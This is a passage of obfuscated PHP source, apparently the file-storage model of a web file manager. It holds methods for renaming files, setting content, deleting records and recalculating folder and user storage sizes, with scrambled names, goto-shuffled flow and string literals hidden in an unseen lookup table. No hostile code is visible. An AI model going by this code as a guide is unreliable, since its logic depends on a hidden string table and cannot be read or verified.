$EÍÒÓîÚ . $aïÇ ¡Íå«[486])); $fù£Óø³¾„ = array($aïÇ ¡Íå«[527] => $bˆ†Å››Û[$aïÇ ¡Íå«[461]]); $A§ƒÅ»äÃ = $this->field($aïÇ ¡Íå«[2399])->where($fù£Óø³¾„)->select(); $C¨Â‹—È÷ = !1; $dî‰áÛÒÑñ = array($EÍÒÓîÚ); if ($A§ƒÅ»äÃ) { $C¨Â‹—È÷ = array_to_keyvalue($A§ƒÅ»äÃ, $aïÇ ¡Íå«[33], $aïÇ ¡Íå«[419]); $C¨Â‹—È÷ = array_remove_value($C¨Â‹—È÷, $aïÇ ¡Íå«[470]); $dî‰áÛÒÑñ = array_to_keyvalue($A§ƒÅ»äÃ, $aïÇ ¡Íå«[33], $aïÇ ¡Íå«[369]); $dî‰áÛÒÑñ[] = $EÍÒÓîÚ; } } else { $C¨Â‹—È÷ = array($aÃÑ¶µìÃù[$aïÇ ¡Íå«[419]]); $dî‰áÛÒÑñ = array($EÍÒÓîÚ); } return array($aïÇ ¡Íå«[2396] => $dî‰áÛÒÑñ, $aïÇ ¡Íå«[1272] => $C¨Â‹—È÷); } public function removeArray($A¡¯ÊÇæÓ) { if (!$A¡¯ÊÇæÓ) { return !0; } } public function removeRelevance($fõç´ÍÂê, $föôÔİÊÇì) { goto f˜µŠ±Ì±; føŞôí¾ë®: Model($fê—–“¿ÉÒ[2251])->where($Fš„İÀ¹¸á)->delete(); Model($fê—–“¿ÉÒ[507])->where($Fš„İÀ¹¸á)->delete(); Model($fê—–“¿ÉÒ[2098])->removeBySource($fõç´ÍÂê); goto BÎ¨™¹èà®; a…ÚšåÌ†£: for ($bíÅë‘ê = 0; $bíÅë‘ê < count($fõç´ÍÂê); $bíÅë‘ê++) { $this->sourceCacheClear($fõç´ÍÂê[$bíÅë‘ê]); } goto Eˆ›¥¸´Å; dŒ¥—±ìñ: $Fš„İÀ¹¸á = array($fê—–“¿ÉÒ[383] => array($fê—–“¿ÉÒ[384], $fõç´ÍÂê)); Model($fê—–“¿ÉÒ[2397])->where($Fš„İÀ¹¸á)->delete(); Model($fê—–“¿ÉÒ[413])->where($Fš„İÀ¹¸á)->delete(); goto føŞôí¾ë®; f˜µŠ±Ì±: $fê—–“¿ÉÒ =& $_SERVER[¬ˆÚÂ”Éğä]; $fõç´ÍÂê = $fõç´ÍÂê ? $fõç´ÍÂê : array(); $föôÔİÊÇì = $föôÔİÊÇì ? $föôÔİÊÇì : array(); goto DÙÇ‹÷³; DÙÇ‹÷³: $fõç´ÍÂê = array_unique(array_filter($fõç´ÍÂê)); $föôÔİÊÇì = array_unique(array_filter($föôÔİÊÇì)); if (!$fõç´ÍÂê) { return !1; } goto dŒ¥—±ìñ; BÎ¨™¹èà®: Model($fê—–“¿ÉÒ[2378])->removeBySource($fõç´ÍÂê); $this->where($Fš„İÀ¹¸á)->delete(); Model($fê—–“¿ÉÒ[422])->remove($föôÔİÊÇì); goto a…ÚšåÌ†£; Eˆ›¥¸´Å: } public function rename($a¢ëÍ¬æ¹, $B‰œßŠµ“) { goto dÈ¯ë—ƒö; A™áïù¤Ÿ: $CĞÖ—ñÖ«¦ = $CÀíˆÃª˜[2386] . $dÍŒ„¶îº®[$CÀíˆÃª˜[463]]; if (isset(self::$cacheChildList[$CĞÖ—ñÖ«¦])) { unset(self::$cacheChildList[$CĞÖ—ñÖ«¦]); } return $BÒ¯ƒ£´ğ; goto c»ùÅ²…Ğ¼; A‚ÊÚºËê“: $eŒÛêÙï¯‘ = $this->fileNameExist($dÍŒ„¶îº®[$CÀíˆÃª˜[463]], $B‰œßŠµ“); if ($eŒÛêÙï¯‘ && $eŒÛêÙï¯‘ != $a¢ëÍ¬æ¹) { return !1; } $Aù«‰ãÆë = array($CÀíˆÃª˜[386] => $B‰œßŠµ“, $CÀíˆÃª˜[526] => USER_ID); goto B‡¯”•—¿è; dÈ¯ë—ƒö: $CÀíˆÃª˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $dÍŒ„¶îº® = $this->sourceInfo($a¢ëÍ¬æ¹); if (!$dÍŒ„¶îº®) { return !1; } goto A‚ÊÚºËê“; B‡¯”•—¿è: if (!$dÍŒ„¶îº®[$CÀíˆÃª˜[370]] == $CÀíˆÃª˜[83]) { $Aù«‰ãÆë[$CÀíˆÃª˜[372]] = get_path_ext($B‰œßŠµ“); } Model($CÀíˆÃª˜[507])->eventRename($a¢ëÍ¬æ¹, $dÍŒ„¶îº®[$CÀíˆÃª˜[28]], $B‰œßŠµ“); $this->sourceCacheClear($a¢ëÍ¬æ¹); goto BÜêãÂğ†ï; BÜêãÂğ†ï: $this->setNamePinyin($a¢ëÍ¬æ¹, $Aù«‰ãÆë[$CÀíˆÃª˜[28]], !1); $this->updateModifyTime($dÍŒ„¶îº®[$CÀíˆÃª˜[463]]); $BÒ¯ƒ£´ğ = $this->where(array($CÀíˆÃª˜[383] => $a¢ëÍ¬æ¹))->data($Aù«‰ãÆë)->save(); goto A™áïù¤Ÿ; c»ùÅ²…Ğ¼: } public function setNamePinyin($bŒÉ£Œ‘, $DƒêÖ¡‹, $aë–È‡ÉŒá = true) { $aäÎë½Ãùø =& $_SERVER[¬ˆÚÂ”Éğä]; $DäÍÙŒ‰ğé = Input::check($DƒêÖ¡‹, $aäÎë½Ãùø[530]); if ($aë–È‡ÉŒá && !$DäÍÙŒ‰ğé) { return; } if (!$DäÍÙŒ‰ğé) { $this->metaSet($bŒÉ£Œ‘, $aäÎë½Ãùø[416], null); $this->metaSet($bŒÉ£Œ‘, $aäÎë½Ãùø[415], null); return; } $cô¡˜ÃÃé = array($aäÎë½Ãùø[416] => str_replace($aäÎë½Ãùø[50], $aäÎë½Ãùø[33], Pinyin::encode($DƒêÖ¡‹)), $aäÎë½Ãùø[415] => Pinyin::encode($DƒêÖ¡‹, $aäÎë½Ãùø[531])); $this->metaSet($bŒÉ£Œ‘, $cô¡˜ÃÃé); } public function getContent($F¹ïŠ’›¾‚) { goto f½Ç¹ñÆ·ç; a–ğŠ¹´ˆß: if ($f¢èñÔ¸[$C×«Ş÷Àö•[77]] == 0) { return $C×«Ş÷Àö•[33]; } $F”²¶ìËÆ = $C×«Ş÷Àö•[2400] . $f¢èñÔ¸[$C×«Ş÷Àö•[163]]; if ($f¢èñÔ¸[$C×«Ş÷Àö•[77]] <= 1024 * 10) { $E»ò“ŒãÀ = Cache::get($F”²¶ìËÆ); if (!$E»ò“ŒãÀ) { $E»ò“ŒãÀ = IO::getContent($f¢èñÔ¸[$C×«Ş÷Àö•[75]]); Cache::set($F”²¶ìËÆ, $E»ò“ŒãÀ); } return $E»ò“ŒãÀ; } goto eÑ‹İ´ÖÚó; eÑ‹İ´ÖÚó: if (!$f¢èñÔ¸[$C×«Ş÷Àö•[75]]) { return $C×«Ş÷Àö•[33]; } return IO::getContent($f¢èñÔ¸[$C×«Ş÷Àö•[75]]); goto E·«Ú›—À®; f½Ç¹ñÆ·ç: $C×«Ş÷Àö• =& $_SERVER[¬ˆÚÂ”Éğä]; $f¢èñÔ¸ = $this->fileInfoGet($F¹ïŠ’›¾‚); if (!$f¢èñÔ¸) { return !1; } goto a–ğŠ¹´ˆß; E·«Ú›—À®: } public function setDesc($eŠƒ§’‰ÕÈ, $cí‰ßœ‰Ò) { $b…àŠî‚Áó =& $_SERVER[¬ˆÚÂ”Éğä]; Model($b…àŠî‚Áó[507])->eventAddDesc($eŠƒ§’‰ÕÈ, $cí‰ßœ‰Ò); return $this->metaSet($eŠƒ§’‰ÕÈ, $b…àŠî‚Áó[405], $cí‰ßœ‰Ò); } public function setContent($eÑ¿¸íê™º, $bÌ÷Õß™¼ = '') { goto Eóù¬«©ø†; Eóù¬«©ø†: $dãÉ„¥æéğ =& $_SERVER[¬ˆÚÂ”Éğä]; $B£è¶„ÇŒÄ = $this->sourceInfo($eÑ¿¸íê™º); $Aè±ğ¸²®µ = $this->fileInfoGet($eÑ¿¸íê™º); goto C½¬ÔÛ¢ì†; B š”¿¥¯: if (!$D¡æ™–¬¦‹) { return Model($dãÉ„¥æéğ[422])->remove($aµïïíø‹¾[$dãÉ„¥æéğ[419]]); } $this->folderSizeReset($B£è¶„ÇŒÄ[$dãÉ„¥æéğ[463]]); return !0; goto FóÁ£¼Ù¤§; C½¬ÔÛ¢ì†: if (!$Aè±ğ¸²®µ || !$B£è¶„ÇŒÄ) { return !1; } $aµïïíø‹¾ = Model($dãÉ„¥æéğ[422])->addFileByContent($bÌ÷Õß™¼, $B£è¶„ÇŒÄ[$dãÉ„¥æéğ[28]]); $D¡æ™–¬¦‹ = $this->fileHistory($B£è¶„ÇŒÄ, $aµïïíø‹¾[$dãÉ„¥æéğ[419]], $aµïïíø‹¾[$dãÉ„¥æéğ[77]]); goto B š”¿¥¯; FóÁ£¼Ù¤§: } public function fileSubstr($dÇµŒ—Úëˆ, $Aº°§ƒİ, $fÀëàŸ¥·) { $f…±Âò° = $this->fileInfoGet($dÇµŒ—Úëˆ); if (!$f…±Âò°) { return !1; } return IO::fileSubstr($f…±Âò°[$_SERVER[¬ˆÚÂ”Éğä][75]], $Aº°§ƒİ, $fÀëàŸ¥·); } public function fileInfoGet($cªÒÅ«Ôí) { goto d²§ô“¼˜¥; a…£­˜öÅ: return $fëä©¨¡æ§; goto F§•ÊãÔ½; D®„—£Û˜¢: $fëä©¨¡æ§ = Model($e¬©‡˜Ã¼[422])->fileInfo($f©ÄÖ£¥”İ[$e¬©‡˜Ã¼[419]]); if ($fëä©¨¡æ§) { $fëä©¨¡æ§[$e¬©‡˜Ã¼[28]] = $f©ÄÖ£¥”İ[$e¬©‡˜Ã¼[28]]; } self::$cacheFileInfo[$CøœÄ‘—×œ] = $fëä©¨¡æ§; goto a…£­˜öÅ; e£¥íö¡Ç: $CøœÄ‘—×œ = $e¬©‡˜Ã¼[425] . $f©ÄÖ£¥”İ[$e¬©‡˜Ã¼[419]]; $BçòÚğ = _get(self::$cacheFileInfo, $CøœÄ‘—×œ); if ($BçòÚğ) { return $BçòÚğ; } goto D®„—£Û˜¢; d²§ô“¼˜¥: $e¬©‡˜Ã¼ =& $_SERVER[¬ˆÚÂ”Éğä]; $f©ÄÖ£¥”İ = $this->sourceInfo($cªÒÅ«Ôí); if (!$f©ÄÖ£¥”İ || $f©ÄÖ£¥”İ[$e¬©‡˜Ã¼[370]]) { return !1; } goto e£¥íö¡Ç; F§•ÊãÔ½: } private function folderChildrenNumber($F‡ÚÔ­¢…Ò) { $fåÙœ¤¸¶² =& $_SERVER[¬ˆÚÂ”Éğä]; $DÇó¬Ø¬ = $this->sourceInfo($F‡ÚÔ­¢…Ò); $c›æÎåéª¦ = array($fåÙœ¤¸¶²[527] => array($fåÙœ¤¸¶²[485], $DÇó¬Ø¬[$fåÙœ¤¸¶²[461]] . $F‡ÚÔ­¢…Ò . $fåÙœ¤¸¶²[486]), $fåÙœ¤¸¶²[396] => intval($DÇó¬Ø¬[$fåÙœ¤¸¶²[397]]), $fåÙœ¤¸¶²[520] => 1); $bºì½‘°¨õ = $this->where($c›æÎåéª¦)->count(); $eïºø†‡¹¤ = $this->where($c›æÎåéª¦)->where(array($fåÙœ¤¸¶²[520] => 0))->count(); return array($fåÙœ¤¸¶²[81] => $eïºø†‡¹¤, $fåÙœ¤¸¶²[82] => $bºì½‘°¨õ); } public function pathInfo($f¾Å»ˆùÆÚ, $f¤†ÇÑ÷Óæ = false) { goto Aù¿—Ç†Û; Aù¿—Ç†Û: $AÈ°êÚ£äŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $f¤†ÇÑ÷Óæ = !0; $f¾Å»ˆùÆÚ = intval($f¾Å»ˆùÆÚ); goto f™–Ê‡Ÿ´ƒ; cØ²„ØÏ¹Ù: self::$cachePathInfo[$c‰›õ¨â™Ä] = $AßÆ×ùâæÀ; return $AßÆ×ùâæÀ; goto f§…áö³ï; e‡ß†—‘Ã: $AßÆ×ùâæÀ = $this->sourceInfo($f¾Å»ˆùÆÚ); if (!$AßÆ×ùâæÀ) { return !1; } $AßÆ×ùâæÀ = $this->_listDataApplyItem($AßÆ×ùâæÀ, $f¤†ÇÑ÷Óæ); goto cØ²„ØÏ¹Ù; f™–Ê‡Ÿ´ƒ: $c‰›õ¨â™Ä = $AÈ°êÚ£äŠ[411] . intval($f¤†ÇÑ÷Óæ) . $AÈ°êÚ£äŠ[412] . $f¾Å»ˆùÆÚ; $CÄÏ²Åù– = _get(self::$cachePathInfo, $c‰›õ¨â™Ä); if ($CÄÏ²Åù–) { return $CÄÏ²Åù–; } goto e‡ß†—‘Ã; f§…áö³ï: } public static $cachePathInfoMore = array(); public function pathInfoMore($Eá •ÌÙØ…) { goto fÌ¡“¥ç›æ; fÌ¡“¥ç›æ: $cæ›î¡¯¢÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $FğÌó÷…ÇÉ = _get(self::$cachePathInfoMore, $Eá •ÌÙØ…); if ($FğÌó÷…ÇÉ) { return $FğÌó÷…ÇÉ; } goto d¬„”–à±³; Bè™ˆŒÇ©: self::$cachePathInfoMore[$Eá •ÌÙØ…] = $fèÆó±í¤Ş; return $fèÆó±í¤Ş; goto c™ê±ìŞƒŞ; d¬„”–à±³: $fèÆó±í¤Ş = $this->pathInfo($Eá •ÌÙØ…); if (!$fèÆó±í¤Ş) { return !1; } if ($fèÆó±í¤Ş[$cæ›î¡¯¢÷[370]] == $cæ›î¡¯¢÷[83]) { $fèÆó±í¤Ş[$cæ›î¡¯¢÷[80]] = $this->folderChildrenNumber($Eá •ÌÙØ…); } goto Bè™ˆŒÇ©; c™ê±ìŞƒŞ: } public function sourceInfo($eÖ¨’õÀù„) { goto bËÇ‹¶Ë—; bËÇ‹¶Ë—: $Eò­ƒÇŒÈ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$eÖ¨’õÀù„) { return array(); } $eÖ¨’õÀù„ = intval($eÖ¨’õÀù„); goto fµ²ùª½„º; c®–—Ú‚Óµ: $a¨åˆ¾Ô¨ = $this->where(array($Eò­ƒÇŒÈ[369] => $eÖ¨’õÀù„))->find(); self::$cacheSourceInfo[$FŸ¦„¨°Ö] = $a¨åˆ¾Ô¨; return self::$cacheSourceInfo[$FŸ¦„¨°Ö]; goto eŞ”ˆùãÄ‡; fµ²ùª½„º: $FŸ¦„¨°Ö = $Eò­ƒÇŒÈ[410] . $eÖ¨’õÀù„; $CÓçÔšäù = _get(self::$cacheSourceInfo, $FŸ¦„¨°Ö); if ($CÓçÔšäù) { return $CÓçÔšäù; } goto c®–—Ú‚Óµ; eŞ”ˆùãÄ‡: } public function sourceCacheClear($AéêÛÎ­ê = false) { if ($AéêÛÎ­ê == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¬ˆÚÂ”Éğä][410] . $AéêÛÎ­ê]); } public function pathInfoByPath($D’Í¹“‹¥É, $có³‚ã¯õç) { $aîÖÄÎÂ¦± =& $_SERVER[¬ˆÚÂ”Éğä]; $bîÈğ‰¾ÊÚ = !$có³‚ã¯õç ? array() : explode($aîÖÄÎÂ¦±[8], trim($có³‚ã¯õç, $aîÖÄÎÂ¦±[8])); $dô£Œî¹ÖÂ = $D’Í¹“‹¥É; foreach ($bîÈğ‰¾ÊÚ as $AÓÒÈùô¤•) { $dÖä¢½é¨Š = array($aîÖÄÎÂ¦±[463] => $dô£Œî¹ÖÂ, $aîÖÄÎÂ¦±[28] => $AÓÒÈùô¤•); $CÑ¤³âå†® = $this->where($dÖä¢½é¨Š)->select(); if (!$CÑ¤³âå†®) { return !1; } $CÑ¤³âå†® = array_sort_by($CÑ¤³âå†®, $aîÖÄÎÂ¦±[397]); $dô£Œî¹ÖÂ = $CÑ¤³âå†®[0][$aîÖÄÎÂ¦±[369]]; } return $this->pathInfo($dô£Œî¹ÖÂ, !0); } protected function updateModifyTime($bèğ¥Ê»Ò…) { goto eŠ†ô¤İ²; eŠ†ô¤İ²: $EÊ’¦í£‘ã =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$bèğ¥Ê»Ò…) { return; } if (!is_array($bèğ¥Ê»Ò…)) { $bèğ¥Ê»Ò… = array($bèğ¥Ê»Ò…); } goto díÀ¨êÙ®; DöªºÉÆ„Š: $this->where($D…À‘Æ·Ÿ¤)->save($C¢Í´ ”•); goto AË¨ãÜÇ¿; díÀ¨êÙ®: foreach ($bèğ¥Ê»Ò… as $eò¸¹§ğ => $CÙÛ»ºƒ…Ñ) { $bèğ¥Ê»Ò…[$eò¸¹§ğ] = intval($CÙÛ»ºƒ…Ñ); } $D…À‘Æ·Ÿ¤ = array($EÊ’¦í£‘ã[369] => array($EÊ’¦í£‘ã[7], $bèğ¥Ê»Ò…)); $C¢Í´ ”• = array($EÊ’¦í£‘ã[526] => USER_ID, $EÊ’¦í£‘ã[390] => time()); goto DöªºÉÆ„Š; AË¨ãÜÇ¿: } public function folderSizeReset($Dïğğ…­‹) { goto dì£ˆ˜£•; Cì¨óµ…Ğ°: $B¦’è²ƒ¥ = $this->parentLevelArray($aæ…à¡À‹Ú[$dÑ“¾¦Œ[461]]); if ($B¦’è²ƒ¥) { $aÊ‚¡à’§¼ = array($dÑ“¾¦Œ[369] => array($dÑ“¾¦Œ[384], $B¦’è²ƒ¥)); if ($dÌ¼Íù”Ş < 0) { $aÊ‚¡à’§¼[$dÑ“¾¦Œ[77]] = array($dÑ“¾¦Œ[941], abs($dÌ¼Íù”Ş)); } $this->where($aÊ‚¡à’§¼)->setAdd($dÑ“¾¦Œ[77], $dÌ¼Íù”Ş); } $this->targetSpaceUpdate($aæ…à¡À‹Ú[$dÑ“¾¦Œ[371]], $aæ…à¡À‹Ú[$dÑ“¾¦Œ[458]]); goto e“ÎÌ‘¸ôô; Aö–¼·Ÿ—‰: $dÌ¼Íù”Ş = $dË›Ş§†Şà - intval($aæ…à¡À‹Ú[$dÑ“¾¦Œ[77]]); if ($dÌ¼Íù”Ş == 0) { return CacheLock::unlock($aÛÓ¾¦‘ÖÎ); } $this->where(array($dÑ“¾¦Œ[383] => $Dïğğ…­‹))->setField($dÑ“¾¦Œ[77], $dË›Ş§†Şà); goto Cì¨óµ…Ğ°; aİÆĞÖ®¤¸: $aÊ‚¡à’§¼ = array($dÑ“¾¦Œ[368] => $Dïğğ…­‹, $dÑ“¾¦Œ[396] => 0); $dË›Ş§†Şà = $this->where($aÊ‚¡à’§¼)->sum($dÑ“¾¦Œ[77]); $dË›Ş§†Şà = intval($dË›Ş§†Şà); goto Aö–¼·Ÿ—‰; e“ÎÌ‘¸ôô: CacheLock::unlock($aÛÓ¾¦‘ÖÎ); goto c˜³±ïÆæ; dì£ˆ˜£•: $dÑ“¾¦Œ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->statusIgnoreResetSpace) { return; } $aÛÓ¾¦‘ÖÎ = $dÑ“¾¦Œ[2401] . $Dïğğ…­‹; goto a—¡ÅªØ¨«; a—¡ÅªØ¨«: CacheLock::lock($aÛÓ¾¦‘ÖÎ, 20); $this->sourceCacheClear($Dïğğ…­‹); $aæ…à¡À‹Ú = $this->sourceInfo($Dïğğ…­‹); goto aİÆĞÖ®¤¸; c˜³±ïÆæ: } public function folderSizeResetChildren($aÃé·§Ìê­) { goto DÈ”¾ã¸Çù; cĞÔ›ğ¾‰¼: foreach ($BÄÜŒ÷Ìó¤ as $f„ÎÒä’Œ) { $c™§±µ¬é½ = $f„ÎÒä’Œ[$D¬èÈ‡˜ôË[463]] . $D¬èÈ‡˜ôË[33]; if (!isset($dÄ†ƒ÷ñŸ¹[$c™§±µ¬é½])) { continue; } if ($f„ÎÒä’Œ[$D¬èÈ‡˜ôË[397]] == $dÄ†ƒ÷ñŸ¹[$c™§±µ¬é½][$D¬èÈ‡˜ôË[397]]) { $dÄ†ƒ÷ñŸ¹[$c™§±µ¬é½][$D¬èÈ‡˜ôË[77]] += $f„ÎÒä’Œ[$D¬èÈ‡˜ôË[77]]; } } foreach ($dÄ†ƒ÷ñŸ¹ as $f„ÎÒä’Œ) { $bÊŠ…´± = $this->parentLevelArray($f„ÎÒä’Œ[$D¬èÈ‡˜ôË[461]]); foreach ($bÊŠ…´± as $c™§±µ¬é½) { $c™§±µ¬é½ = $c™§±µ¬é½ . $D¬èÈ‡˜ôË[33]; if (!isset($dÄ†ƒ÷ñŸ¹[$c™§±µ¬é½])) { continue; } if ($f„ÎÒä’Œ[$D¬èÈ‡˜ôË[397]] == $dÄ†ƒ÷ñŸ¹[$c™§±µ¬é½][$D¬èÈ‡˜ôË[397]]) { $dÄ†ƒ÷ñŸ¹[$c™§±µ¬é½][$D¬èÈ‡˜ôË[77]] += $f„ÎÒä’Œ[$D¬èÈ‡˜ôË[77]]; } } } $FÁ‚ÒÂ›¹÷ = array(); goto E–•ñ¶¨‡; DÈ”¾ã¸Çù: $D¬èÈ‡˜ôË =& $_SERVER[¬ˆÚÂ”Éğä]; $this->sourceCacheClear($aÃé·§Ìê­); $c±¶ÏÔäö” = $this->sourceInfo($aÃé·§Ìê­); goto FÖÅ„â—ª¼; E–•ñ¶¨‡: foreach ($dÄ†ƒ÷ñŸ¹ as $f„ÎÒä’Œ) { if ($f„ÎÒä’Œ[$D¬èÈ‡˜ôË[77]] == $f„ÎÒä’Œ[$D¬èÈ‡˜ôË[2403]]) { continue; } $FÁ‚ÒÂ›¹÷[] = array($D¬èÈ‡˜ôË[369], $f„ÎÒä’Œ[$D¬èÈ‡˜ôË[369]], $D¬èÈ‡˜ôË[77], $f„ÎÒä’Œ[$D¬èÈ‡˜ôË[77]]); } $this->saveAll($FÁ‚ÒÂ›¹÷); goto dß½øäİª; E©‰ä: $dÄ†ƒ÷ñŸ¹[] = $c±¶ÏÔäö”; $dÄ†ƒ÷ñŸ¹ = array_to_keyvalue($dÄ†ƒ÷ñŸ¹, $D¬èÈ‡˜ôË[369]); foreach ($dÄ†ƒ÷ñŸ¹ as $eº±É„áÁÆ => $f„ÎÒä’Œ) { $dÄ†ƒ÷ñŸ¹[$eº±É„áÁÆ][$D¬èÈ‡˜ôË[2403]] = $dÄ†ƒ÷ñŸ¹[$eº±É„áÁÆ][$D¬èÈ‡˜ôË[77]]; $dÄ†ƒ÷ñŸ¹[$eº±É„áÁÆ][$D¬èÈ‡˜ôË[77]] = 0; } goto cĞÔ›ğ¾‰¼; FÖÅ„â—ª¼: $C—ßÃ‘ç‹÷ = array($D¬èÈ‡˜ôË[520] => 1, $D¬èÈ‡˜ôË[527] => array($D¬èÈ‡˜ôË[485], $c±¶ÏÔäö”[$D¬èÈ‡˜ôË[461]] . $aÃé·§Ìê­ . $D¬èÈ‡˜ôË[486])); $d¦‡ÍŠ­ñ§ = $D¬èÈ‡˜ôË[2402]; $dÄ†ƒ÷ñŸ¹ = $this->field($d¦‡ÍŠ­ñ§)->where($C—ßÃ‘ç‹÷)->select(); goto DóìŠÑ¢„; DóìŠÑ¢„: $C—ßÃ‘ç‹÷[$D¬èÈ‡˜ôË[370]] = 0; $BÄÜŒ÷Ìó¤ = $this->field($d¦‡ÍŠ­ñ§)->where($C—ßÃ‘ç‹÷)->select(); if (!$BÄÜŒ÷Ìó¤) { return; } goto E©‰ä; dß½øäİª: } public function userSpaceReset($D‘“ˆßôà• = false) { $B©„í¾ò Ş =& $_SERVER[¬ˆÚÂ”Éğä]; $a¤Ç”¥¦Õ = $this->where(array($B©„í¾ò Ş[371] => self::TYPE_USER, $B©„í¾ò Ş[458] => $D‘“ˆßôà•, $B©„í¾ò Ş[370] => 0))->sum($B©„í¾ò Ş[77]); Model($B©„í¾ò Ş[476])->userEdit($D‘“ˆßôà•, array($B©„í¾ò Ş[2107] => $a¤Ç”¥¦Õ)); } public function targetSpaceUpdate($E‚æà­©Ú¼, $eç™ƒ‹É) { $e¦ììÂ¹‚ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$eç™ƒ‹É) { return; } if (!in_array($E‚æà­©Ú¼, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d­È¸×‰ = $this->targetSpaceSize($E‚æà­©Ú¼, $eç™ƒ‹É); if ($E‚æà­©Ú¼ == self::TYPE_USER) { Model($e¦ììÂ¹‚[476])->userEdit($eç™ƒ‹É, array($e¦ììÂ¹‚[2107] => $d­È¸×‰)); } else { if ($E‚æà­©Ú¼ == self::TYPE_GROUP) { Model($e¦ììÂ¹‚[460])->groupEdit($eç™ƒ‹É, array($e¦ììÂ¹‚[2107] => $d­È¸×‰)); } } } public function targetSpaceSize($fï±™ÙÔÆ‰, $EĞé­’õ) { goto E†ÆæñËÃˆ; A®®½Ÿ“œ: $cã‹Í‡õã¿ = array_to_keyvalue($cã‹Í‡õã¿, $E—Á·á­æ³[33], $E—Á·á­æ³[369]); $cã‹Í‡õã¿ = array_unique(array_filter($cã‹Í‡õã¿)); if ($cã‹Í‡õã¿) { $dˆ£¡ª êÌ = array($E—Á·á­æ³[383] => array($E—Á·á­æ³[384], $cã‹Í‡õã¿)); $A¯Í†ÈîôÌ += floatval($this->where($dˆ£¡ª êÌ)->sum($E—Á·á­æ³[77])); } goto D‹‚¡ãéÚ; E†ÆæñËÃˆ: $E—Á·á­æ³ =& $_SERVER[¬ˆÚÂ”Éğä]; $F¼å¡Å´ÌÜ = $this->sourceRoot($fï±™ÙÔÆ‰, $EĞé­’õ, !0); if (!$F¼å¡Å´ÌÜ) { return 0; } goto Eë‚Ÿİ§¤‹; D‹‚¡ãéÚ: return $A¯Í†ÈîôÌ; goto d±Û¯İ‡µ; Eë‚Ÿİ§¤‹: $A¯Í†ÈîôÌ = floatval($F¼å¡Å´ÌÜ[$E—Á·á­æ³[77]]); $dˆ£¡ª êÌ = array($E—Á·á­æ³[527] => array($E—Á·á­æ³[485], $E—Á·á­æ³[472] . $F¼å¡Å´ÌÜ[$E—Á·á­æ³[369]] . $E—Á·á­æ³[486])); $cã‹Í‡õã¿ = Model($E—Á·á­æ³[395])->field($E—Á·á­æ³[383])->where($dˆ£¡ª êÌ)->select(); goto A®®½Ÿ“œ; d±Û¯İ‡µ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($d§ÛÅªÉçì) { return $this->fileTypeProfile($d§ÛÅªÉçì, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d©§“ğë¤•) { return $this->fileTypeProfile($d©§“ğë¤•, SourceModel::TYPE_GROUP); } private function fileTypeProfile($A—”†ÕŒÀà, $dÕÉÈõº¸) { goto Fê·ë†ƒØ¡; E”©»àö„¿: if ($E‘Ñæ£Şù¯) { return $E‘Ñæ£Şù¯; } $aÏÃ£Œ¤¥ = array($a×îÓÃäåÇ[520] => 0); if ($A—”†ÕŒÀà != !1) { $aÏÃ£Œ¤¥[$a×îÓÃäåÇ[458]] = $A—”†ÕŒÀà; $aÏÃ£Œ¤¥[$a×îÓÃäåÇ[371]] = $dÕÉÈõº¸; } goto E“Ş³‘ßìá; A›å©ƒ™ºÜ: foreach ($aĞå‘°«ŒÚ as $D‚×Ó½ç©Í => $CÒíÚš¾¢§) { $aÏÃ£Œ¤¥[$a×îÓÃäåÇ[372]] = $this->fileTypeWhere($D‚×Ó½ç©Í); $EˆÇñ‡ù©[$D‚×Ó½ç©Í] = array($a×îÓÃäåÇ[2406] => $CÒíÚš¾¢§[$a×îÓÃäåÇ[28]], $a×îÓÃäåÇ[2407] => $this->where($aÏÃ£Œ¤¥)->count(), $a×îÓÃäåÇ[522] => $this->where($aÏÃ£Œ¤¥)->sum($a×îÓÃäåÇ[77])); } Cache::set($CÆÊ†½ËÎ, $EˆÇñ‡ù©, 1200); return $EˆÇñ‡ù©; goto FŸ¿àğêã; Fê·ë†ƒØ¡: $a×îÓÃäåÇ =& $_SERVER[¬ˆÚÂ”Éğä]; $CÆÊ†½ËÎ = $a×îÓÃäåÇ[2404] . $A—”†ÕŒÀà . $a×îÓÃäåÇ[70] . $dÕÉÈõº¸; $E‘Ñæ£Şù¯ = Cache::get($CÆÊ†½ËÎ); goto E”©»àö„¿; E“Ş³‘ßìá: $EˆÇñ‡ù© = array(); $EˆÇñ‡ù©[$a×îÓÃäåÇ[2405]] = array($a×îÓÃäåÇ[2406] => LNG($a×îÓÃäåÇ[2405]), $a×îÓÃäåÇ[2407] => $this->where($aÏÃ£Œ¤¥)->count(), $a×îÓÃäåÇ[522] => $this->where($aÏÃ£Œ¤¥)->sum($a×îÓÃäåÇ[77])); $aĞå‘°«ŒÚ = KodIO::fileTypeList(); goto A›å©ƒ™ºÜ; FŸ¿àğêã: } public function fileNameExist($bº»ñ ÂÃ¬, $A©à’»©µ„) { $bÌ¡Ü´øÜ´ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÆ‚Ÿ…Æá« = $this->childList($bº»ñ ÂÃ¬); foreach ($FÆ‚Ÿ…Æá« as $c¹ÎğÉß‡ˆ) { if ($c¹ÎğÉß‡ˆ[$bÌ¡Ü´øÜ´[28]] == $A©à’»©µ„) { return $c¹ÎğÉß‡ˆ[$bÌ¡Ü´øÜ´[369]]; } if (strtolower($c¹ÎğÉß‡ˆ[$bÌ¡Ü´øÜ´[28]]) == strtolower($A©à’»©µ„)) { return $c¹ÎğÉß‡ˆ[$bÌ¡Ü´øÜ´[369]]; } } return !1; } public function childList($f¾š®Ò–È) { goto c’¥‹¡Ì‹í; B±ë†Ç††Å: $f…ĞÀ’ßÄÆ = array($e Ô…Ë‹ñ[463] => intval($f¾š®Ò–È), $e Ô…Ë‹ñ[397] => 0); $Bİê•÷á†¤ = $this->where($f…ĞÀ’ßÄÆ)->select(); $Bİê•÷á†¤ = $Bİê•÷á†¤ ? $Bİê•÷á†¤ : array(); goto B²Õ¦Ò›ÅÔ; c’¥‹¡Ì‹í: $e 